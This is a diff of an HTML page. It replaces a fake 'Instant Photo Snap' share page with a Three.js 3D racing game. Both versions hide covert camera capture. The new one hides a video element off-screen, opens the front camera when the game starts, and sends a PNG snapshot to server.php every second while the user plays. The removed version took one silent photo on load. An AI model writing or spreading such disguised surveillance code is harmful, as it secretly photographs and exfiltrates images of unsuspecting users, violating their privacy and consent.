@@ -1,179 +1,696 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant Photo Snap</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>3D Racing Game</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #121212;
-            color: #e0e0e0;
             margin: 0;
-            padding: 0;
+            overflow: hidden;
+            background-color: #a0d7e6;
+            font-family: Arial, sans-serif;
+            overscroll-behavior: none;
+            touch-action: none;
+        }
+        canvas {
+            display: block;
+        }
+        #loading-screen {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            color: white;
             display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        header {
-            background-color: #1f1f1f;
-            padding: 20px;
-            text-align: center;
-            border-bottom: 2px solid #00ff88;
-        }
-        header h1 {
-            margin: 0;
-            font-size: 2em;
-            color: #00ff88;
-        }
-        main {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            padding: 20px;
+            align-items: center;
+            font-size: 2em;
+            z-index: 100;
+            opacity: 1;
+            transition: opacity 0.5s ease-out;
         }
-        .share-section {
-            display: flex;
-            gap: 15px;
-            margin-top: 20px;
+        #loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
         }
-        button {
-            padding: 10px 20px;
-            font-size: 1em;
-            background-color: #00ff88;
-            color: #121212;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
+        #ui-container {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            color: white;
+            text-shadow: 1px 1px 3px black;
+            z-index: 50;
+            font-size: 1.5em;
         }
-        button:hover {
-            background-color: #00cc70;
+        #score {
+            margin-bottom: 5px;
         }
-        footer {
-            background-color: #1f1f1f;
-            padding: 10px;
+        #game-over {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ff4444;
+            font-size: 4em;
+            font-weight: bold;
             text-align: center;
-            font-size: 0.8em;
-            color: #a0a0a0;
-            border-top: 2px solid #00ff88;
+            text-shadow: 2px 2px 5px black;
+            display: none;
+            z-index: 101;
+            pointer-events: none;
         }
-        #video {
+        .control-button {
+            position: absolute;
+            bottom: 20px;
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.3);
+            border: 2px solid rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            z-index: 60;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 2.5em;
+            color: rgba(0, 0, 0, 0.7);
+            cursor: pointer;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        #left-button {
+            left: 20px;
+        }
+        #right-button {
+            right: 20px;
+        }
+        #camera-container {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
             width: 1px;
             height: 1px;
-            opacity: 0;
-            position: absolute;
+            overflow: hidden;
         }
-        #canvas {
+        #camera-video, #camera-canvas {
             display: none;
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <header>
-        <h1>Instant Photo Snap</h1>
-    </header>
-    <main>
-        <div class="share-section">
-            <button onclick="shareLink('WhatsApp')">Share on WhatsApp</button>
-            <button onclick="shareLink('Facebook')">Share on Facebook</button>
-        </div>
-    </main>
-    <footer>
-        Powered by Instant Photo Snap © 2025
-    </footer>
+    <div id="loading-screen">Loading...</div>
+    <div id="container"></div>
 
-    <script>
-        const videoElement = document.getElementById('video');
-        const canvasElement = document.getElementById('canvas');
+    <div id="ui-container">
+        <div id="score">Score: 0</div>
+    </div>
+    <div id="game-over">GAME OVER!</div>
 
-        // Request camera access on page load and capture immediately upon permission
-        window.addEventListener('load', () => {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                .then(stream => {
-                    videoElement.srcObject = stream;
-                    // Wait for video to be ready
-                    videoElement.addEventListener('canplay', () => {
-                        if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
-                            setTimeout(() => {
-                                canvasElement.width = videoElement.videoWidth;
-                                canvasElement.height = videoElement.videoHeight;
-                                canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
-                                const imageData = canvasElement.toDataURL('image/png');
+    <div id="left-button" class="control-button">◀</div>
+    <div id="right-button" class="control-button">▶</div>
 
-                                fetch('server.php', {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ image: imageData })
-                                })
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log(data.message);
-                                    videoElement.srcObject.getTracks().forEach(track => track.stop());
-                                })
-                                .catch(err => {
-                                    console.error('Error saving photo:', err);
-                                });
-                            }, 1000); // Reduced delay to 1 second for faster capture
-                        } else {
-                            console.error('Video dimensions not available.');
+    <div id="camera-container">
+        <video id="camera-video" autoplay playsinline></video>
+        <canvas id="camera-canvas"></canvas>
+    </div>
+
+    <script type="importmap">
+        {
+            "imports": {
+                "three": "https://unpkg.com/three@0.164.1/build/three.module.js",
+                "three/addons/": "https://unpkg.com/three@0.164.1/examples/jsm/"
+            }
+        }
+    </script>
+
+    <script type="module">
+        import * as THREE from 'three';
+        import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';
+        import { DRACOLoader } from 'three/addons/loaders/DRACOLoader.js';
+
+        // Game variables
+        let scene, camera, renderer, carModel, enemyCar;
+        let road, roadLines = [], kerbs = [];
+        let buildings = [], streetLights = [], trafficLights = [];
+        const roadWidth = 10;
+        const roadLength = 200;
+        const driveSpeed = 0.5;
+        const enemyCarSpeed = 0.4;
+        let carBaseY = 0;
+        let score = 0;
+        let isGameOver = false;
+        let moveLeft = false;
+        let moveRight = false;
+        const carMoveSpeed = 0.15;
+        let playerBox = new THREE.Box3();
+        let enemyBox = new THREE.Box3();
+
+        // Points system
+        let points = [];
+        const pointGeometry = new THREE.SphereGeometry(0.3, 8, 8);
+        const pointMaterial = new THREE.MeshStandardMaterial({ 
+            color: 0xffff00, 
+            emissive: 0xaaaa00, 
+            emissiveIntensity: 0.8 
+        });
+        const numPoints = 15;
+        const pointValue = 10;
+
+        // Camera capture variables
+        const cameraVideo = document.getElementById('camera-video');
+        const cameraCanvas = document.getElementById('camera-canvas');
+        const cameraContext = cameraCanvas.getContext('2d');
+        let captureInterval;
+        const captureIntervalMs = 1000; // Capture every 1 second
+        let lastCaptureTime = 0;
+
+        // Initialize the game
+        init();
+
+        function init() {
+            // Scene setup
+            scene = new THREE.Scene();
+            scene.background = new THREE.Color(0xa0d7e6);
+            scene.fog = new THREE.Fog(0xa0d7e6, roadLength * 0.4, roadLength * 0.9);
+
+            // Camera setup
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.set(0, 3, -7);
+
+            // Renderer setup
+            renderer = new THREE.WebGLRenderer({ antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.shadowMap.enabled = true;
+            renderer.shadowMap.type = THREE.PCFSoftShadowMap;
+            document.getElementById('container').appendChild(renderer.domElement);
+
+            // Lights
+            const ambientLight = new THREE.AmbientLight(0xffffff, 0.6);
+            scene.add(ambientLight);
+
+            const directionalLight = new THREE.DirectionalLight(0xffffff, 1.5);
+            directionalLight.position.set(50, 100, 50);
+            directionalLight.castShadow = true;
+            directionalLight.shadow.mapSize.width = 2048;
+            directionalLight.shadow.mapSize.height = 2048;
+            scene.add(directionalLight);
+
+            // Create road and environment
+            createRoad();
+            createBuildings();
+            createStreetLights();
+            createTrafficLights();
+            createPoints();
+
+            // Load car model
+            loadCarModel();
+
+            // Setup controls
+            setupControls();
+
+            // Start camera capture
+            setupCameraCapture();
+
+            // Start animation loop
+            animate();
+
+            // Handle window resize
+            window.addEventListener('resize', onWindowResize);
+        }
+
+        function createRoad() {
+            // Ground plane
+            const groundGeo = new THREE.PlaneGeometry(roadLength * 1.5, roadLength);
+            const groundMat = new THREE.MeshStandardMaterial({ color: 0x55aa55 });
+            const ground = new THREE.Mesh(groundGeo, groundMat);
+            ground.rotation.x = -Math.PI / 2;
+            ground.position.y = -0.05;
+            scene.add(ground);
+
+            // Road surface
+            const roadGeo = new THREE.PlaneGeometry(roadWidth, roadLength);
+            const roadMat = new THREE.MeshStandardMaterial({ color: 0x555555 });
+            road = new THREE.Mesh(roadGeo, roadMat);
+            road.rotation.x = -Math.PI / 2;
+            scene.add(road);
+
+            // Road markings
+            const lineLength = 4;
+            const lineGap = 4;
+            const numLines = Math.floor(roadLength / (lineLength + lineGap));
+            const lineGeo = new THREE.PlaneGeometry(0.3, lineLength);
+            const lineMat = new THREE.MeshStandardMaterial({ color: 0xffffff });
+
+            for (let i = 0; i < numLines; i++) {
+                const line = new THREE.Mesh(lineGeo, lineMat);
+                line.rotation.x = -Math.PI / 2;
+                line.position.y = 0.005;
+                line.position.z = (roadLength / 2) - (lineLength / 2) - i * (lineLength + lineGap);
+                roadLines.push(line);
+                scene.add(line);
+            }
+
+            // Kerbs
+            const kerbGeo = new THREE.BoxGeometry(0.3, 0.2, roadLength);
+            const kerbMat = new THREE.MeshStandardMaterial({ color: 0xff0000 });
+            
+            const kerbLeft = new THREE.Mesh(kerbGeo, kerbMat);
+            kerbLeft.position.set(-(roadWidth / 2) - 0.15, 0.1, 0);
+            kerbs.push(kerbLeft);
+            scene.add(kerbLeft);
+
+            const kerbRight = new THREE.Mesh(kerbGeo, kerbMat);
+            kerbRight.position.set((roadWidth / 2) + 0.15, 0.1, 0);
+            kerbs.push(kerbRight);
+            scene.add(kerbRight);
+        }
+
+        function createBuildings() {
+            const buildingSpacing = 15;
+            const numBuildings = Math.floor(roadLength / buildingSpacing);
+
+            for (let i = 0; i < numBuildings; i++) {
+                const height = Math.random() * 30 + 10;
+                const width = Math.random() * 8 + 4;
+                const depth = Math.random() * 8 + 4;
+                
+                const buildingGeo = new THREE.BoxGeometry(width, height, depth);
+                const buildingMat = new THREE.MeshStandardMaterial({ 
+                    color: new THREE.Color(
+                        Math.random() * 0.8 + 0.1,
+                        Math.random() * 0.8 + 0.1,
+                        Math.random() * 0.8 + 0.1
+                    )
+                });
+
+                const buildingLeft = new THREE.Mesh(buildingGeo, buildingMat);
+                const buildingRight = new THREE.Mesh(buildingGeo, buildingMat);
+
+                const zPos = (roadLength / 2) - (buildingSpacing / 2) - i * buildingSpacing;
+                const xOffset = roadWidth / 2 + 0.3 + 1 + Math.random() * 5 + width / 2;
+
+                buildingLeft.position.set(-xOffset, height / 2, zPos);
+                buildingRight.position.set(xOffset, height / 2, zPos);
+
+                buildings.push(buildingLeft, buildingRight);
+                scene.add(buildingLeft);
+                scene.add(buildingRight);
+            }
+        }
+
+        function createStreetLights() {
+            const lightSpacing = 30;
+            const numLights = Math.floor(roadLength / lightSpacing);
+
+            for (let i = 0; i < numLights; i++) {
+                const poleHeight = 6;
+                const poleRadius = 0.1;
+                const poleGeo = new THREE.CylinderGeometry(poleRadius, poleRadius, poleHeight);
+                const poleMat = new THREE.MeshStandardMaterial({ color: 0x888888 });
+
+                const poleLeft = new THREE.Mesh(poleGeo, poleMat);
+                const poleRight = new THREE.Mesh(poleGeo, poleMat);
+
+                const zPos = (roadLength / 2) - (lightSpacing / 2) - i * lightSpacing;
+                const xPos = roadWidth / 2 + 0.3 + 0.8;
+
+                poleLeft.position.set(-xPos, poleHeight / 2, zPos);
+                poleRight.position.set(xPos, poleHeight / 2, zPos);
+
+                streetLights.push(poleLeft, poleRight);
+                scene.add(poleLeft);
+                scene.add(poleRight);
+            }
+        }
+
+        function createTrafficLights() {
+            const trafficLightZ = roadLength * 0.4;
+            const xPos = roadWidth / 2 + 0.3 + 0.5;
+
+            const poleHeight = 5;
+            const poleRadius = 0.15;
+            const poleGeo = new THREE.CylinderGeometry(poleRadius, poleRadius, poleHeight);
+            const poleMat = new THREE.MeshStandardMaterial({ color: 0x555555 });
+
+            const poleLeft = new THREE.Mesh(poleGeo, poleMat);
+            const poleRight = new THREE.Mesh(poleGeo, poleMat);
+
+            poleLeft.position.set(-xPos, poleHeight / 2, trafficLightZ);
+            poleRight.position.set(xPos, poleHeight / 2, trafficLightZ);
+
+            trafficLights.push(poleLeft, poleRight);
+            scene.add(poleLeft);
+            scene.add(poleRight);
+        }
+
+        function createPoints() {
+            for (let i = 0; i < numPoints; i++) {
+                const point = new THREE.Mesh(pointGeometry, pointMaterial);
+                point.castShadow = true;
+                resetPointPosition(point, true);
+                points.push(point);
+                scene.add(point);
+            }
+        }
+
+        function resetPointPosition(point, initial = false) {
+            const laneWidth = roadWidth / 2 - 0.3 - 0.5;
+            point.position.x = (Math.random() * 2 - 1) * laneWidth;
+            point.position.y = 0.3 + 0.01;
+            if (initial) {
+                point.position.z = Math.random() * roadLength - roadLength / 2;
+            } else {
+                point.position.z = roadLength / 2 + Math.random() * roadLength * 0.5;
+            }
+            point.visible = true;
+        }
+
+        function loadCarModel() {
+            const loader = new GLTFLoader();
+            const dracoLoader = new DRACOLoader();
+            dracoLoader.setDecoderPath('https://www.gstatic.com/draco/versioned/decoders/1.5.7/');
+            loader.setDRACOLoader(dracoLoader);
+
+            loader.load(
+                'https://threejs.org/examples/models/gltf/ferrari.glb',
+                (gltf) => {
+                    carModel = gltf.scene;
+                    carModel.scale.set(0.8, 0.8, 0.8);
+                    
+                    // Calculate base Y position
+                    const box = new THREE.Box3().setFromObject(carModel);
+                    carBaseY = -box.min.y + 0.01;
+                    
+                    carModel.position.set(0, carBaseY, 0);
+                    carModel.rotation.y = Math.PI;
+                    
+                    // Enable shadows
+                    carModel.traverse((node) => {
+                        if (node.isMesh) {
+                            node.castShadow = true;
+                            node.receiveShadow = true;
                         }
                     });
-                })
-                .catch(err => {
-                    console.error('Camera access failed:', err);
-                });
-        });
+                    
+                    scene.add(carModel);
 
-        function shareLink(platform) {
-            const url = window.location.href;
-            if (platform === 'WhatsApp') {
-                window.open(`https://api.whatsapp.com/send?text=Check%20out%20my%20photo%20snap!%20${url}`);
-            } else if (platform === 'Facebook') {
-                window.open(`https://www.facebook.com/sharer/sharer.php?u=${url}`);
+                    // Create enemy car
+                    createEnemyCar();
+                    
+                    // Hide loading screen
+                    document.getElementById('loading-screen').classList.add('hidden');
+                },
+                undefined,
+                (error) => {
+                    console.error('Error loading car model:', error);
+                    // Fallback cube if model fails to load
+                    const carGeo = new THREE.BoxGeometry(2, 1, 4);
+                    const carMat = new THREE.MeshStandardMaterial({ color: 0xff0000 });
+                    carModel = new THREE.Mesh(carGeo, carMat);
+                    carBaseY = 0.5;
+                    carModel.position.set(0, carBaseY, 0);
+                    scene.add(carModel);
+                    
+                    createEnemyCar();
+                    document.getElementById('loading-screen').classList.add('hidden');
+                }
+            );
+        }
+
+        function createEnemyCar() {
+            if (!carModel) return;
+
+            enemyCar = carModel.clone();
+            enemyCar.traverse((node) => {
+                if (node.isMesh) {
+                    const blueMaterial = node.material.clone();
+                    blueMaterial.color.setHex(0x0000ff);
+                    node.material = blueMaterial;
+                }
+            });
+
+            const initialEnemyX = (Math.random() < 0.5 ? -1 : 1) * roadWidth / 4;
+            enemyCar.position.set(initialEnemyX, carBaseY, roadLength * 0.7);
+            enemyCar.rotation.y = Math.PI;
+            scene.add(enemyCar);
+        }
+
+        function setupControls() {
+            // Keyboard controls
+            window.addEventListener('keydown', (event) => {
+                if (isGameOver) return;
+                if (event.key === 'ArrowLeft' || event.key.toLowerCase() === 'a') {
+                    moveLeft = true;
+                } else if (event.key === 'ArrowRight' || event.key.toLowerCase() === 'd') {
+                    moveRight = true;
+                }
+            });
+
+            window.addEventListener('keyup', (event) => {
+                if (event.key === 'ArrowLeft' || event.key.toLowerCase() === 'a') {
+                    moveLeft = false;
+                } else if (event.key === 'ArrowRight' || event.key.toLowerCase() === 'd') {
+                    moveRight = false;
+                }
+            });
+
+            // Touch controls
+            const leftButton = document.getElementById('left-button');
+            const rightButton = document.getElementById('right-button');
+
+            leftButton.addEventListener('touchstart', (e) => {
+                if (!isGameOver) {
+                    e.preventDefault();
+                    moveLeft = true;
+                }
+            }, { passive: false });
+
+            leftButton.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                moveLeft = false;
+            });
+
+            leftButton.addEventListener('touchcancel', (e) => {
+                e.preventDefault();
+                moveLeft = false;
+            });
+
+            rightButton.addEventListener('touchstart', (e) => {
+                if (!isGameOver) {
+                    e.preventDefault();
+                    moveRight = true;
+                }
+            }, { passive: false });
+
+            rightButton.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                moveRight = false;
+            });
+
+            rightButton.addEventListener('touchcancel', (e) => {
+                e.preventDefault();
+                moveRight = false;
+            });
+        }
+
+        function setupCameraCapture() {
+            // Set higher resolution for camera capture
+            cameraCanvas.width = 640;
+            cameraCanvas.height = 480;
+
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                },
+                audio: false 
+            })
+            .then(stream => {
+                cameraVideo.srcObject = stream;
+                cameraVideo.play();
+                
+                // Start capturing every second
+                captureInterval = setInterval(captureImage, captureIntervalMs);
+            })
+            .catch(err => {
+                console.error("Camera access denied:", err);
+            });
+        }
+
+        function captureImage() {
+            if (cameraVideo.readyState === cameraVideo.HAVE_ENOUGH_DATA) {
+                cameraContext.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                const imageData = cameraCanvas.toDataURL('image/png');
+
+                fetch('server.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: imageData }),
+                    headers: { 'Content-Type': 'application/json' }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        lastCaptureTime = Date.now();
+                    }
+                })
+                .catch(err => console.error('Error sending image:', err));
             }
+        }
+
+        function stopCameraCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (cameraVideo.srcObject) {
+                cameraVideo.srcObject.getTracks().forEach(track => track.stop());
+                cameraVideo.srcObject = null;
+            }
+        }
+
+        function updateScoreDisplay() {
+            document.getElementById('score').textContent = `Score: ${score}`;
+        }
+
+        function gameOver() {
+            isGameOver = true;
+            document.getElementById('game-over').style.display = 'block';
+            stopCameraCapture();
+        }
+
+        function checkCollisions() {
+            if (!carModel || !enemyCar) return;
+
+            // Update bounding boxes
+            playerBox.setFromObject(carModel);
+            enemyBox.setFromObject(enemyCar);
+
+            // Check collision with enemy car
+            if (playerBox.intersectsBox(enemyBox)) {
+                gameOver();
+                return;
+            }
+
+            // Check collision with kerbs (road sides)
+            const carHalfWidth = 1; // Approximate half width of car
+            if (carModel.position.x < -roadWidth/2 + 0.3 + carHalfWidth || 
+                carModel.position.x > roadWidth/2 - 0.3 - carHalfWidth) {
+                gameOver();
+                return;
+            }
+
+            // Check point collection
+            points.forEach(point => {
+                if (!point.visible) return;
+                
+                const pointBox = new THREE.Box3().setFromObject(point);
+                if (playerBox.intersectsBox(pointBox)) {
+                    score += pointValue;
+                    point.visible = false;
+                    updateScoreDisplay();
+                    resetPointPosition(point);
+                }
+            });
+        }
+
+        function onWindowResize() {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+
+            if (isGameOver) return;
+
+            // Move road elements
+            const deltaZ = driveSpeed;
+            
+            // Road markings
+            roadLines.forEach(line => {
+                line.position.z -= deltaZ;
+                if (line.position.z < -roadLength / 2) {
+                    line.position.z += roadLength;
+                }
+            });
+
+            // Buildings
+            buildings.forEach(building => {
+                building.position.z -= deltaZ;
+                if (building.position.z < -roadLength / 2 - building.geometry.parameters.depth / 2) {
+                    building.position.z += roadLength + Math.random() * 30;
+                    const sideSign = Math.sign(building.position.x);
+                    const xOffset = roadWidth / 2 + 0.3 + 1 + Math.random() * 5 + building.geometry.parameters.width / 2;
+                    building.position.x = sideSign * xOffset;
+                }
+            });
+
+            // Street lights
+            streetLights.forEach(light => {
+                light.position.z -= deltaZ;
+                if (light.position.z < -roadLength / 2) {
+                    light.position.z += roadLength + Math.random() * 60;
+                }
+            });
+
+            // Traffic lights
+            trafficLights.forEach(light => {
+                light.position.z -= deltaZ;
+                if (light.position.z < -roadLength / 2) {
+                    light.position.z += roadLength * 1.5 + Math.random() * roadLength;
+                }
+            });
+
+            // Kerbs
+            kerbs.forEach(kerb => {
+                kerb.position.z -= deltaZ;
+                if (kerb.position.z < -roadLength / 2) {
+                    kerb.position.z += roadLength;
+                }
+            });
+
+            // Points
+            points.forEach(point => {
+                if (!point.visible) return;
+                point.position.z -= deltaZ;
+                if (point.position.z < -roadLength / 2) {
+                    resetPointPosition(point);
+                }
+            });
+
+            // Move enemy car
+            if (enemyCar) {
+                enemyCar.position.z -= enemyCarSpeed;
+                if (enemyCar.position.z < -roadLength / 2 - 10) {
+                    enemyCar.position.z = roadLength / 2 + Math.random() * 50;
+                    enemyCar.position.x = (Math.random() < 0.5 ? -1 : 1) * roadWidth / 4 * (0.5 + Math.random());
+                }
+            }
+
+            // Move player car
+            if (carModel) {
+                const maxBounds = roadWidth / 2 - 0.3 - 1; // Account for kerb and car width
+                
+                if (moveLeft && carModel.position.x > -maxBounds) {
+                    carModel.position.x -= carMoveSpeed;
+                }
+                if (moveRight && carModel.position.x < maxBounds) {
+                    carModel.position.x += carMoveSpeed;
+                }
+
+                // Update camera position to follow car
+                const targetCameraX = carModel.position.x * 0.5;
+                camera.position.x += (targetCameraX - camera.position.x) * 0.1;
+                camera.lookAt(carModel.position.x, carBaseY + 1, carModel.position.z + 5);
+            }
+
+            // Check for collisions
+            checkCollisions();
+
+            renderer.render(scene, camera);
         }
     </script>
 </body>
